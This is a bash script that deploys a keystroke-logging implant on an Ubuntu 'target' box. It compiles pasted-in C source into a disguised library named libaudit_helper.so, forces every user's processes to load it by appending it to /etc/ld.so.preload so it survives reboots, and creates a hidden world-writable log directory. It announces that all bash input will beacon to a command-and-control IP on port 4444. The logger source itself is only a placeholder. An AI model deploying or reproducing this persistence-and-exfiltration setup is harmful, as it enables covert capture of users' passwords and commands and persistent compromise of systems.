#!/bin/bash
# Run on the TARGET Ubuntu 22.04 box as root/sudo

C2_IP="192.168.1.79"   # ← change to your Kali IP before prebake

# 1. Write the C source directly onto the target
cat > /tmp/.init_helper.c << 'CSRC'
# [paste logger.c content here, or scp it over]
CSRC

# 2. Compile the shared library
gcc -shared -fPIC -o /lib/x86_64-linux-gnu/libaudit_helper.so \
    /tmp/.init_helper.c -ldl -lpthread -lreadline
rm /tmp/.init_helper.c

# 3. Register it for ALL users via ld.so.preload (survives reboot)
echo "/lib/x86_64-linux-gnu/libaudit_helper.so" >> /etc/ld.so.preload

# 4. Create hidden local log dir
mkdir -p /var/lib/.cache
chmod 777 /var/lib/.cache

echo "[+] Deployed. All bash readline input will now beacon to $C2_IP:4444"
